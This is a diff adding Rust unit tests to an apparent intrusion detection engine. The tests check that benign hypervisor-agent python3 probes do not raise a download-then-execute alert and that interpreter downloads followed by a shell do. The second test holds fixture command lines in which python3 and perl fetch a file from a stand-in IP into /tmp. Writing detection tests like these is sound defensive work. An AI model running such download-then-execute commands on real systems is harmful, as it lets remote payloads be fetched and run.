@@ -578,6 +578,54 @@ fn temporal_engine_detects_download_exec_then_shell() {
     assert!(hits.iter().any(|h| h == "phi_download_exec"));
 }
 
+// Hypervisor guest agents (qemu-ga) probe the guest with python3 imports and
+// shell one-liners every few seconds in one daemon session. No download
+// happens, so phi_download_exec (a high-severity alert) must not fire.
+#[test]
+fn temporal_engine_ignores_interpreter_probes_without_download() {
+    let mut t = TemporalEngine::with_default_rules();
+    let probes = [
+        "python3 -c import string",
+        "python3 /usr/sbin/get-disk-serial.py ",
+    ];
+    for (i, cmdline) in probes.iter().enumerate() {
+        let ts = 100 + (i as i64) * 5;
+        let mut interpreter = event(ts, EventClass::ProcessExec, "python3", "sh", 0);
+        interpreter.session_id = 1;
+        interpreter.command_line = Some((*cmdline).to_string());
+        let mut shell = event(ts + 2, EventClass::ProcessExec, "dash", "qemu-ga", 0);
+        shell.session_id = 1;
+        shell.command_line = Some("/bin/sh -c lsblk".to_string());
+        let hits = [t.observe(&interpreter), t.observe(&shell)].concat();
+        assert!(
+            hits.iter().all(|h| h != "phi_download_exec"),
+            "interpreter probe {cmdline:?} raised phi_download_exec"
+        );
+    }
+}
+
+// Interpreters remain download tools when the command line shows a download.
+#[test]
+fn temporal_engine_detects_interpreter_download_then_shell() {
+    for (process, cmdline) in [
+        (
+            "python3",
+            "python3 -c import urllib.request; urllib.request.urlretrieve('http://198.51.100.9/x', '/tmp/x')",
+        ),
+        ("perl", "perl -MLWP::Simple -e getstore('198.51.100.9/x','/tmp/x')"),
+    ] {
+        let mut t = TemporalEngine::with_default_rules();
+        let mut downloader = event(40, EventClass::ProcessExec, process, "bash", 1000);
+        downloader.command_line = Some(cmdline.to_string());
+        assert!(t.observe(&downloader).is_empty());
+        let shell = event(50, EventClass::ProcessExec, "sh", "bash", 1000);
+        assert!(
+            t.observe(&shell).iter().any(|h| h == "phi_download_exec"),
+            "{process} download did not raise phi_download_exec"
+        );
+    }
+}
+
 #[test]
 // AC-DET-252
 fn temporal_engine_detects_credential_exfil_rule() {
